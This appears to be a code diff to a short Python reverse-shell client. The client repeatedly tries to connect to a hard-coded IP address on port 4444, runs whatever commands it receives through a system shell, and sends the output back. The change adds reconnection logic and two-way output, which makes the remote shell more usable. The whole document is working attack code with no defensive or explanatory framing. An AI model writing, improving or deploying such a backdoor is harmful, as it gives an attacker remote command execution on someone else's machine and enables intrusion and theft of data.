@@ -5,19 +5,31 @@ import socket
 import subprocess
 from time import sleep
 
-HOST = '192.168.0.4'
+HOST = '172.27.5.188'
 PORT = 4444
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-    s.connect((HOST, PORT))
     while True:
         try:
+            s.connect((HOST, PORT))
+            break
+        except:
+            print('cant connect')
             sleep(2)
-            data = s.recv(1024)
-            print(data)
-            if data:
-                subprocess.call(data.decode(),shell=True)
+            pass
 
+    while True:
+        try:
+            #sleep(2)
+            data = s.recv(1024)
+            print(data.decode())
+            if data:
+                print('start working')
+                output = subprocess.check_output(data.decode(),shell=True)
+                s.send(output)
+                print('end working')
+            if not data:
+                break
         except Exception as error:
             print(error)
             break
